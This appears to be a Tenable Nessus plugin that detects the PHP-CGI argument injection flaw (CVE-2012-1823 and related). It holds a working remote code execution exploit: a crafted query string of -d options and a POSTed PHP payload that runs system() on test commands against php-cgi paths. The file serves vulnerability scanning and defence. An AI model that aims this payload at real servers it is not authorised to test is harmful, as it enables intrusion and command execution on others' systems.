#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(70728);
  script_version("1.14");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/25");

  script_cve_id(
    "CVE-2012-1823",
    "CVE-2012-2311",
    "CVE-2012-2335",
    "CVE-2012-2336"
  );
  script_bugtraq_id(53388);
  script_xref(name:"CERT", value:"520827");
  script_xref(name:"EDB-ID", value:"29290");
  script_xref(name:"EDB-ID", value:"29316");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/04/15");

  script_name(english:"Apache PHP-CGI Remote Code Execution");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a version of PHP that allows arbitrary
code execution.");
  script_set_attribute(attribute:"description", value:
"The PHP installation on the remote web server contains a flaw that
could allow a remote attacker to pass command-line arguments as part of
a query string to the PHP-CGI program.  This could be abused to execute
arbitrary code, reveal PHP source code, cause a system crash, etc.");
  script_set_attribute(attribute:"solution", value:
"Upgrade to PHP 5.3.13 / 5.4.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2012-2311");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'PHP CGI Argument Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:"CANVAS");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/05/03");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/05/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/11/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:php:php");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("data_protection.inc");

port = get_http_port(default:80, php:TRUE);

files = make_list(
  "/cgi-bin/php",
  "/cgi-bin/php-cgi",
  "/cgi-bin/php5",
  "/cgi-bin/php.cgi",
  "/cgi-bin/php4"
);

# Try to exploit the issue to run a command.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";

foreach file (files)
{
  url =
    "-d allow_url_include=on "+
    "-d safe_mode=off "+
    "-d suhosin.simulation=on "+
    '-d disable_functions="" '+
    "-d open_basedir=none "+
    "-d auto_prepend_file=php://input " +
    "-d cgi.force_redirect=0 "+
    "-d cgi.redirect_status_env=0 "+
    "-n";
  url = str_replace(find:" ", replace:"+", string:url);
  url = file + "?" + toupper(urlencode(
    str:url,
    unreserved:"+"
  ));
  token = (SCRIPT_NAME - ".nasl") + "-" + unixtime();

  foreach cmd (cmds)
  {
    payload = '<?php echo "Content-Type:text/html'+"\r\n\r\n"+'"; '+
    "echo '" + token + "'; system('" + cmd + "'); die; ?>";

    res = http_send_recv3(
      port         : port,
      method       : "POST",
      item         : url,
      data         : payload,
      content_type : "application/x-www-form-urlencoded",
      exit_on_fail : TRUE
    );

    if (
      token >< res[2] &&
      egrep(pattern:cmd_pats[cmd], string:res[2])
    )
    {
      if (report_verbosity > 0)
      {
        report =
          '\nNessus was able to verify the issue exists using the following request :' +
          '\n' +
          '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) +
          '\n' + http_last_sent_request() +
          '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) + '\n';

        if (report_verbosity > 1)
        {
          output = strstr(res[2], token) - token;

          report +=
            '\n' + 'This produced the following output :' +
            '\n' +
            '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) +
            '\n' + data_protection::sanitize_uid(output:chomp(output)) +
            '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
        }
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}
exit(0, "The web server listening on port " + port + " is not affected.");
